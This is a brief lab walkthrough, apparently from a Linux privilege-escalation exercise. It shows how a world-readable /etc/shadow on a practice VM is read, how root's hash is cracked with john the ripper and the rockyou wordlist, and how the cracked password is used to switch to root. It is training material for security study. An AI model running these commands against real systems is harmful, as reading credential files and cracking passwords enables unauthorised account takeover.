### /etc/shadow


The `/etc/shadow` file *contains user password hashes* and is **usually readable only by the root user.**

Note that the `/etc/shadow` file on the VM is world-readable:

	ls -l /etc/shadow

#### View the contents of the /etc/shadow file:

	cat /etc/shadow

Each line of the file represents a user. **A user's password hash (if they have one) can be found between the first and second colons (:) of each line.**

###### Task details
Save the root user's hash to a file called hash.txt on your Kali VM and use john the ripper to crack it. You may have to unzip /usr/share/wordlists/rockyou.txt.gz first and run the command using sudo depending on your version of Kali:

	john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

Switch to the root user, using the cracked password:

	su root

Remember to exit out of the root shell before continuing!

## Results
	john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
	Created directory: /root/.john
